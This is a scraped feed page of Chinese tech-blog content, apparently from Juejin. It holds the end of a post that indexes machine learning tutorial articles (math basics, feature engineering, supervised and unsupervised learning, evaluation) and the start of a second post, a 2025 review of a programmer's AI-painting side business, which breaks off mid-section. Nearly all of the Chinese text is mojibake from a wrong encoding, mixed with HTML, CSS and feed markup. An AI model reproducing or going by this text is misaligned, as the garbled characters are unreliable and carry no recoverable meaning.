<p>å¦‚æœä½ çœ‹åˆ°äº†è¿™é‡Œï¼Œä½ å¯ä»¥åœ¨è„‘è¢‹é‡Œå›å¿†ä¸€ä¸‹æœºå™¨å­¦ä¹ çš„çŸ¥è¯†æ¡†æ¶ï¼Œæ¯ä¸ªæ¡ç›®é‡Œéƒ½æœ‰ä»€ä¹ˆçŸ¥è¯†ç‚¹ä½ è¿˜è®°å¾—å—ï¼Ÿè¿™ä¸ªçŸ¥è¯†ç‚¹ä½ å¤§æ¦‚å…¨éƒ½ç†è§£äº†å—ï¼Ÿæ˜¯ä¸æ˜¯å·²ç»æŒæ¡äº†ï¼Ÿé¢è¯•å®˜å¦‚æœé—®æˆ‘æˆ‘èƒ½æ¸…æ™°çš„å›ç­”å‡ºæ¥å—ï¼Ÿ</p>
<p>å¦‚æœä¸Šé¢çš„ç­”æ¡ˆå…¨éƒ½æ˜¯yesï¼Œé‚£ä¹ˆæ­å–œä½ ï¼Œä½ å·²ç»ä¸ºæ·±åº¦å­¦ä¹ å’ŒAIå¤§æ¨¡å‹æ‰“ä¸‹äº†åšå®çš„åŸºç¡€ï¼Œæ›´æ·±å±‚æ¬¡çš„å­¦ä¹ ä¸ä¼šæ¯”ä»0åˆ°1æ›´å›°éš¾äº†ï¼</p>
<p>è¿™ä¸ªçŸ¥è¯†åº“åˆ°è¿™é‡Œå¹¶æ²¡æœ‰ç»“æŸï¼Œæˆ‘åç»­ä¼šè¿›è¡ŒæŒç»­æ›´æ–°ï¼Œå¦‚æœå¤§å®¶è§‰å¾—æœ‰ä»€ä¹ˆç»å…¸çš„çŸ¥è¯†ç‚¹æˆ–è€…é¢è¯•å¸¸é—®çš„çŸ¥è¯†ç‚¹æˆ‘æ²¡æœ‰è®²åˆ°ï¼Œæ¬¢è¿åœ¨ä¸‹æ–¹ç•™è¨€ï¼ï¼ï¼</p>
<p>æˆ‘æŠŠæœºå™¨å­¦ä¹ çš„æ‰€æœ‰æ–‡ç« å‡åˆ—åœ¨äº†ä¸‹æ–¹ï¼Œä¾›å¤§å®¶éšæ—¶é˜…è¯»ã€‚</p>
<h2 data-id="heading-0">æœºå™¨å­¦ä¹ æ¦‚è¿°å’Œæ•°å­¦åŸºç¡€</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1984777337598936630" target="_blank" title="https://zhuanlan.zhihu.com/p/1984777337598936630" ref="nofollow noopener noreferrer">ä¸€æ–‡ææ‡‚æœºå™¨å­¦ä¹ å…¥é—¨çŸ¥è¯†ï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1985464409682884606" target="_blank" title="https://zhuanlan.zhihu.com/p/1985464409682884606" ref="nofollow noopener noreferrer">ä¸€æ–‡ææ‡‚æœºå™¨å­¦ä¹ çº¿æ€§ä»£æ•°åŸºç¡€çŸ¥è¯†ï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1985843315665556596" target="_blank" title="https://zhuanlan.zhihu.com/p/1985843315665556596" ref="nofollow noopener noreferrer">ä¸€æ–‡ææ‡‚æœºå™¨å­¦ä¹ ä¸­çš„ä¼˜åŒ–æ–¹æ³•ï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1986214900901631235" target="_blank" title="https://zhuanlan.zhihu.com/p/1986214900901631235" ref="nofollow noopener noreferrer">æœºå™¨å­¦ä¹ ä¸­çš„å­¦ä¹ ç†è®º</a></p>
<h2 data-id="heading-1">æ•°æ®ä¸ç‰¹å¾å·¥ç¨‹</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1986571005150393573" target="_blank" title="https://zhuanlan.zhihu.com/p/1986571005150393573" ref="nofollow noopener noreferrer">æœºå™¨å­¦ä¹ ä¸­çš„æ•°æ®é¢„å¤„ç†æ–¹æ³•å¤§å…¨ï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1986937774515966052" target="_blank" title="https://zhuanlan.zhihu.com/p/1986937774515966052" ref="nofollow noopener noreferrer">æœºå™¨å­¦ä¹ ç‰¹å¾å·¥ç¨‹ä¸­çš„ç‰¹å¾é€‰æ‹©</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1987286853355860184" target="_blank" title="https://zhuanlan.zhihu.com/p/1987286853355860184" ref="nofollow noopener noreferrer">ä¸€æ–‡ææ‡‚æœºå™¨å­¦ä¹ ä¸­çš„ç‰¹å¾æ„é€ ï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1987671291134775527" target="_blank" title="https://zhuanlan.zhihu.com/p/1987671291134775527" ref="nofollow noopener noreferrer">ä¸€æ–‡ææ‡‚æœºå™¨å­¦ä¹ ä¸­çš„ç‰¹å¾é™ç»´ï¼</a></p>
<h2 data-id="heading-2">ç›‘ç£å­¦ä¹ æ–¹æ³•</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1988209749930570714" target="_blank" title="https://zhuanlan.zhihu.com/p/1988209749930570714" ref="nofollow noopener noreferrer">ä¸‡å­—é•¿æ–‡ï¼å›å½’æ¨¡å‹æœ€å…¨è®²è§£ï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1988220820246528878" target="_blank" title="https://zhuanlan.zhihu.com/p/1988220820246528878" ref="nofollow noopener noreferrer">ä¸‡å­—é•¿æ–‡ï¼ä¸€æ–‡ææ‡‚ç›‘ç£å­¦ä¹ ä¸­çš„åˆ†ç±»æ¨¡å‹ï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1988607240530310302" target="_blank" title="https://zhuanlan.zhihu.com/p/1988607240530310302" ref="nofollow noopener noreferrer">ä¸€æ–‡ææ‡‚æ ‘æ¨¡å‹ä¸é›†æˆæ¨¡å‹</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1989117049310573686" target="_blank" title="https://zhuanlan.zhihu.com/p/1989117049310573686" ref="nofollow noopener noreferrer">ä¸€æ–‡ææ‡‚ç›‘ç£å­¦ä¹ ä¸­çš„é›†æˆå­¦ä¹ ï¼</a></p>
<h2 data-id="heading-3">æ— ç›‘ç£å­¦ä¹ æ–¹æ³•</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1989476470503016400" target="_blank" title="https://zhuanlan.zhihu.com/p/1989476470503016400" ref="nofollow noopener noreferrer">ä¸€æ–‡ææ‡‚K-Means èšç±»ï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1991660950718277623" target="_blank" title="https://zhuanlan.zhihu.com/p/1991660950718277623" ref="nofollow noopener noreferrer">K-Medoidsèšç±»æ–¹æ³•å’ŒK-Meansæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1993096866754221035" target="_blank" title="https://zhuanlan.zhihu.com/p/1993096866754221035" ref="nofollow noopener noreferrer">ä¸€æ–‡ææ‡‚å±‚æ¬¡èšç±»å’Œå¯†åº¦èšç±»æ–¹æ³•ï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1993373759931954886" target="_blank" title="https://zhuanlan.zhihu.com/p/1993373759931954886" ref="nofollow noopener noreferrer">ä¸€æ–‡ææ‡‚æœºå™¨å­¦ä¹ ä¸­çš„PCAä¸»æˆåˆ†åˆ†æï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1993671061439549575" target="_blank" title="https://zhuanlan.zhihu.com/p/1993671061439549575" ref="nofollow noopener noreferrer">æœºå™¨å­¦ä¹ ä¸­ç‹¬ç«‹æˆåˆ†åˆ†æICAå’Œä¸»æˆåˆ†åˆ†æPCAæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1994189802527014929" target="_blank" title="https://zhuanlan.zhihu.com/p/1994189802527014929" ref="nofollow noopener noreferrer">ä¸€æ–‡ææ‡‚t-SNEå’ŒUMAPé™ç»´æ–¹æ³•ï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1994553416505116303" target="_blank" title="https://zhuanlan.zhihu.com/p/1994553416505116303" ref="nofollow noopener noreferrer">ä¸‡å­—é•¿æ–‡ï¼ææ‡‚æœºå™¨å­¦ä¹ ä¸­çš„æ¦‚ç‡å›¾æ¨¡å‹</a></p>
<h2 data-id="heading-4">åŠç›‘ç£ä¸å¼ºåŒ–å­¦ä¹ </h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1995268800132686540" target="_blank" title="https://zhuanlan.zhihu.com/p/1995268800132686540" ref="nofollow noopener noreferrer">ä¸‡å­—é•¿æ–‡ï¼ææ‡‚æœºå™¨å­¦ä¹ ä¸­åŠç›‘ç£å­¦ä¹ çš„ç»å…¸æ–¹æ³•ï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1995612529041351227" target="_blank" title="https://zhuanlan.zhihu.com/p/1995612529041351227" ref="nofollow noopener noreferrer">ä¸‡å­—é•¿æ–‡ï¼ææ‡‚å¼ºåŒ–å­¦ä¹ çš„åŸºç¡€çŸ¥è¯†ï¼</a></p>
<h2 data-id="heading-5">æ¨¡å‹è¯„ä¼°ä¸é€‰æ‹©</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1996228177396265403" target="_blank" title="https://zhuanlan.zhihu.com/p/1996228177396265403" ref="nofollow noopener noreferrer">ä¸€æ–‡ææ‡‚æœºå™¨å­¦ä¹ ä¸­çš„æ•°æ®åˆ’åˆ†ä¸éªŒè¯æ–¹æ³•ï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1996724312397346362" target="_blank" title="https://zhuanlan.zhihu.com/p/1996724312397346362" ref="nofollow noopener noreferrer">ä¸‡å­—é•¿æ–‡ï¼ææ‡‚æœºå™¨å­¦ä¹ ä¸­çš„åˆ†ç±»|å›å½’|èšç±»ä»»åŠ¡éƒ½æœ‰å“ªäº›å¸¸ç”¨çš„è¯„ä¼°æŒ‡æ ‡ï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1997453295883674299" target="_blank" title="https://zhuanlan.zhihu.com/p/1997453295883674299" ref="nofollow noopener noreferrer">æœºå™¨å­¦ä¹ ä¸­éƒ½æœ‰å“ªäº›ç»å…¸çš„æ¨¡å‹è°ƒä¼˜æ–¹æ³•ï¼Ÿ</a></p>
<p>æœ€æ–°çš„æ–‡ç« éƒ½åœ¨å…¬ä¼—å·aicotingæ›´æ–°ï¼Œåˆ«å¿˜è®°å…³æ³¨å“¦ï¼ï¼ï¼</p>
<p>ä½œè€…ï¼šcoting</p>
<p>åˆ†äº«æ˜¯ä¸€ç§ä¿¡ä»°ï¼Œè¿æ¥è®©æˆé•¿æ›´æœ‰æ¸©åº¦ã€‚</p>
<p>æˆ‘ä»¬ä¸‹æ¬¡ä¸è§ä¸æ•£ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç¨‹åºå‘˜å‰¯ä¸š | 2025 å¹´åº¦å¤ç›˜ï½œä»ä¸ªäººèƒ½åŠ›ï¼Œåˆ°å¯æŒç»­å•†ä¸šç»“æ„çš„ä¸€å¹´]]></title>    <link>https://juejin.cn/post/7601028900886069294</link>    <guid>https://juejin.cn/post/7601028900886069294</guid>    <pubDate>2026-01-30T15:49:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7601028900886069294" data-draft-id="7600982613653979186" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç¨‹åºå‘˜å‰¯ä¸š | 2025 å¹´åº¦å¤ç›˜ï½œä»ä¸ªäººèƒ½åŠ›ï¼Œåˆ°å¯æŒç»­å•†ä¸šç»“æ„çš„ä¸€å¹´"/> <meta itemprop="keywords" content="åç«¯,åˆ›ä¸š"/> <meta itemprop="datePublished" content="2026-01-30T15:49:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å˜Ÿå˜ŸMD"/> <meta itemprop="url" content="https://juejin.cn/user/3368559354851470"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç¨‹åºå‘˜å‰¯ä¸š | 2025 å¹´åº¦å¤ç›˜ï½œä»ä¸ªäººèƒ½åŠ›ï¼Œåˆ°å¯æŒç»­å•†ä¸šç»“æ„çš„ä¸€å¹´
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3368559354851470/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å˜Ÿå˜ŸMD
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T15:49:27.000Z" title="Fri Jan 30 2026 15:49:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{line-height:1.75;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;letter-spacing:2px;background-image:linear-gradient(90deg,rgba(50,0,0,.05) 3%,transparent 0),linear-gradient(1turn,rgba(50,0,0,.05) 3%,transparent 0);background-size:20px 20px;background-position:50%;word-break:break-word;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body h1{font-size:23px;margin-bottom:5px;font-weight:700;padding-left:10px;border-left:5px solid #773098}.markdown-body h2{font-size:19px;font-weight:700;padding-left:10px;border-left:5px solid #916dd5}.markdown-body h3{font-size:17px;font-weight:700;padding-left:10px;border-left:5px solid #d89cf6}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;max-width:100%;margin:1em 0;border-radius:6px;box-shadow:2px 4px 7px #999;user-select:none}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{padding:.2em .5em;font-weight:700;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-size:1em;color:#916dd5;word-break:break-word;overflow-x:auto;background-color:none;border-radius:2px}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-weight:400;font-size:.9em;padding:16px 12px;margin:0;color:#333;word-break:normal;overflow-x:auto;background:#f8f8f8;scroll-behavior:smooth}.markdown-body a{text-decoration:none;color:#916dd5;font-weight:700;border-bottom:1px solid #916dd5}.markdown-body a:active,.markdown-body a:hover{color:#773098}.markdown-body table{display:inline-block!important;font-size:14px;width:auto;max-width:100%;overflow:auto;border:1px solid #916dd5;border-collapse:collapse}.markdown-body thead{background-color:#916dd5;color:#fff;text-align:left}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;border:1px solid #916dd5}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #d89cf6;background-color:#f4eeff}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0;line-height:26px}.markdown-body ol,.markdown-body ul{padding-left:28px;list-style-type:circle}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{color:#916dd5;font-weight:700}.markdown-body b:before,.markdown-body strong:before{content:"ã€Œ"}.markdown-body b:after,.markdown-body strong:after{content:"ã€"}.markdown-body em,.markdown-body i{color:#916dd5}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="github-gist">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff;color:#333}.hljs-comment,.hljs-meta{color:#969896}.hljs-emphasis,.hljs-quote,.hljs-strong,.hljs-template-variable,.hljs-variable{color:#df5000}.hljs-keyword,.hljs-selector-tag,.hljs-type{color:#d73a49}.hljs-attribute,.hljs-bullet,.hljs-literal,.hljs-symbol{color:#0086b3}.hljs-name,.hljs-section{color:#63a35c}.hljs-tag{color:#333}.hljs-attr,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-id,.hljs-selector-pseudo,.hljs-title{color:#6f42c1}.hljs-addition{color:#55a532;background-color:#eaffea}.hljs-deletion{color:#bd2c00;background-color:#ffecec}.hljs-link{text-decoration:underline}.hljs-number{color:#005cc5}.hljs-string{color:#032f62}</style><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2557cd7a86814ef8af74fe2f6ba77795~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp#?w=900&amp;h=383&amp;s=91599&amp;e=jpg&amp;b=64a5ef" alt="å¿…çœ‹å¤§å­—æœ€æ–°æ¶ˆæ¯é‡ç£…å…¬ä¼—å·é¦–å›¾(2) (1).jpg" loading="lazy"/></p>
<blockquote>
<p>æœ¬æ–‡é¦–å‘äºå…¬ä¼—å·ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F5pCcN4c9RjOBtt0M-RUGaQ" target="_blank" title="https://mp.weixin.qq.com/s/5pCcN4c9RjOBtt0M-RUGaQ" ref="nofollow noopener noreferrer">å˜Ÿçˆ·åˆ›ä¸šæ—¥è®°</a>Â ã€‚ æˆ‘å·²ç»åšæŒæ—¥æ›´700å¤©+ï¼Œæ¬¢è¿è¿‡æ¥è¿½å‰§~</p>
</blockquote>
<p>æ—¶é—´ä¸€æ‹–å°±æœˆåº•äº†ï¼Œ 2025å¹´çš„å¹´åº¦å¤ç›˜å·®ç‚¹éš¾äº§ï¼Œä½†æ˜¯è¯¥å†™è¿˜æ˜¯è¦å†™ï¼Œå¯¹è‡ªå·±çš„ä¸€ä¸ªäº¤ä»£ï¼Œä¹Ÿæ˜¯å¯¹æ–°çš„ä¸€å¹´çš„æœŸå¾…ã€‚</p>
<p>å›çœ‹ 2025 å¹´ï¼Œæˆ‘æœ€å¤§çš„æ„Ÿå—ä¸æ˜¯â€œå¿™â€ï¼Œè€Œæ˜¯<strong>ç»ˆäºä¸å†è¿·èŒ«äº†</strong>ã€‚</p>
<p>è¿™ä¸€å¹´ï¼Œæˆ‘æ²¡æœ‰è¿½é€æ–°çš„é£å£ï¼Œä¹Ÿæ²¡æœ‰å†é¢‘ç¹æ›´æ¢æ–¹å‘ï¼Œè€Œæ˜¯å›´ç»•å·²ç»éªŒè¯è¿‡çš„èƒ½åŠ›ï¼Œå¼€å§‹æ­å»ºå±äºè‡ªå·±çš„å•†ä¸šç»“æ„ã€‚</p>
<p>å¦‚æœç”¨ä¸€å¥è¯æ€»ç»“ 2025 å¹´ï¼Œé‚£å°±æ˜¯ï¼š</p>
<blockquote>
<p>è¿™æ˜¯æˆ‘æŠŠä¸ªäººèƒ½åŠ›ï¼ŒçœŸæ­£è½¬åŒ–ä¸ºå¯æŒç»­å•†ä¸šç³»ç»Ÿçš„ä¸€å¹´ã€‚</p>
</blockquote>
<p>ä¸‹é¢ä»å‡ ä¸ªå…³é”®æ¨¡å—ï¼Œç³»ç»Ÿæ€§åœ°å¤ç›˜è¿™ä¸€å¹´ï¼Œç”¨nanoåšçš„æ±‡æ€»æµ·æŠ¥çœŸä¸é”™~</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/36d861b35b37467bb9a9c716cf38c72e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zif5ZifTUQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770392966&amp;x-signature=GF5Ksv8G6ple8e%2FNl2JJowTlYYM%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h2 data-id="heading-0">ä¸€ã€2025å¹´ï¼Œæˆ‘åœ¨åšä»€ä¹ˆï¼Ÿ</h2>
<p>2025 å¹´ï¼Œæˆ‘åšçš„äº‹æƒ…çœ‹èµ·æ¥å¾ˆå¤šï¼Œä½†ä¸»çº¿å…¶å®éå¸¸æ¸…æ™°ï¼š</p>
<ul>
<li>
<p>å›´ç»•Â <strong>AI ç»˜ç”» / ComfyUI</strong>Â æŒç»­è¾“å‡ºå†…å®¹ï¼Œæ‰“é€ ä¸ªäºº IP</p>
</li>
<li>
<p>ä»å•ä¸€çº¿ä¸Šåˆ›ä½œè€…ï¼Œå»¶å±•åˆ°Â <strong>çº¿ä¸‹ç»„ç»‡ä¸å…¬å¸åŒ–å°è¯•</strong></p>
</li>
<li>
<p>ä¸ºä¸‹ä¸€é˜¶æ®µçš„Â <strong>äº§å“åŒ–ã€ç³»ç»ŸåŒ–ã€å¤åˆ©åŒ–</strong>Â åšå‡†å¤‡</p>
</li>
</ul>
<p>è¿™ä¸€å¹´ï¼Œæˆ‘ä¸å†çº ç»“â€œè¦ä¸è¦åšè¿™ä¸ªé¡¹ç›®â€ï¼Œè€Œæ˜¯åœ¨ä¸æ–­é—®è‡ªå·±ï¼š</p>
<blockquote>
<p>è¿™ä»¶äº‹ï¼Œå€¼ä¸å€¼å¾—è¢«é•¿æœŸæ”¾å¤§ï¼Ÿ</p>
</blockquote>
<h2 data-id="heading-1">äºŒã€AI ç»˜ç”» IPï¼šçœŸæ­£è·‘é€šçš„ä¸€å¹´</h2>
<h4 data-id="heading-2">ä¸ŠåŠå¹´ï¼šä»¥æœåŠ¡å‹æ”¶å…¥ä¸ºä¸»</h4>
<p>2025 å¹´ä¸ŠåŠå¹´ï¼ŒAI ç»˜ç”»ç›¸å…³çš„æ”¶å…¥ï¼Œä¸»è¦æ¥è‡ªå’Œå½±è§†æœºæ„çš„åˆä½œåŸ¹è®­ï¼ŒåŒ…æ‹¬çº¿ä¸Šå’Œçº¿ä¸‹çš„çŸ­æœŸè¯¾ç¨‹ã€‚è¿™ç±»æ¨¡å¼çš„ç‰¹ç‚¹å¾ˆæ˜æ˜¾ï¼š</p>
<ul>
<li>æ”¶å…¥ç›¸å¯¹ç¨³å®š</li>
<li>ä½†å¼ºä¾èµ–æ—¶é—´</li>
<li>å¤©èŠ±æ¿æ¸…æ™°å¯è§</li>
</ul>
<p>å½“æ—¶æˆ‘å·²ç»æ„è¯†åˆ°ï¼Œè¿™å¹¶ä¸æ˜¯æˆ‘æƒ³é•¿æœŸä¾èµ–çš„å½¢æ€ã€‚</p>
<h4 data-id="heading-3">ä¸‹åŠå¹´ï¼šå†…å®¹ + IP çš„è½¬æŠ˜ç‚¹</h4>
<p>ä» 6 æœˆå¼€å§‹ï¼Œæˆ‘å¼€å§‹å’Œå¹³å°åˆä½œï¼Œå°è¯•ç”¨Â <strong>æ–‡ç«  + è§†é¢‘</strong>Â çš„æ–¹å¼æŒç»­è¾“å‡ºå†…å®¹ï¼Œå¹¶é€æ­¥å½¢æˆç»„åˆå‹æ”¶å…¥ç»“æ„ï¼š</p>
<ul>
<li>
<p>å¹³å°ç¨¿è´¹ä¸åˆ›ä½œè€…æ¿€åŠ±</p>
</li>
<li>
<p>å†…å®¹å¹³å°çš„åˆ›ä½œæ”¶ç›Š</p>
</li>
<li>
<p>åœ¨æ–‡ç« å’Œè§†é¢‘ä¸­è‡ªç„¶æ‰¿æ¥å·¥å…·ç±»ã€ç½‘ç›˜ç±»ç­‰é•¿æœŸåˆ†æˆ</p>
</li>
</ul>
<p>è¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡éå¸¸æ¸…æ™°åœ°æ„Ÿå—åˆ°ï¼š</p>
<blockquote>
<p><strong>å†…å®¹ + IP + æ¸ é“ï¼Œæœ¬èº«å°±æ˜¯ä¸€ä¸ªå¯å¤åˆ©çš„ç”Ÿäº§ç³»ç»Ÿã€‚</strong></p>
</blockquote>
<p>å³ä½¿ä¸æ¥ä»»ä½•å•†å•ï¼Œè¿™å¥—ç»“æ„ä¹Ÿèƒ½ç¨³å®šè¿è½¬ã€‚<br/>
è€Œä¸€æ—¦å åŠ å•†å•æˆ–è½¯æ–‡åˆä½œï¼Œæ•´ä½“ä¸Šé™å°±ä¼šè¢«æ˜æ˜¾æ‹‰é«˜ã€‚</p>
<p>æ›´é‡è¦çš„æ˜¯ï¼Œè¿™ä¸€åˆ‡éƒ½å›´ç»•åŒä¸€ä¸ªå‚ç›´èµ›é“å±•å¼€ï¼Œæ²¡æœ‰åˆ†æ•£ç²¾åŠ›ï¼Œå¹¶ä¸”èƒ½å®ç°é—­ç¯çš„å¢é•¿é£è½®ï¼Œæ˜¯å¤åˆ©çš„ä¸€ç§ä½“ç°ã€‚</p>
<ul>
<li>ç›®å‰å…¬ä¼—å·ç²‰ä¸ï¼š12540</li>
<li>Bç«™ç²‰ä¸ï¼š7795</li>
<li>æ²¹ç®¡ï¼š2460</li>
</ul>
<p>æ˜å¹´å¤ç›˜çš„æ—¶å€™å†å›æ¥å¯¹æ¯”</p>
<h2 data-id="heading-4">ä¸‰ã€çº¿ä¸‹ç¦ AIï¼šä»å…¬ç›Šåˆ°å•†ä¸šåŒ–çš„æ¢ç´¢</h2>
<p>2025 å¹´ï¼Œæˆ‘å¹¶æ²¡æœ‰åªæŠŠé‡å¿ƒæ”¾åœ¨çº¿ä¸Šã€‚</p>
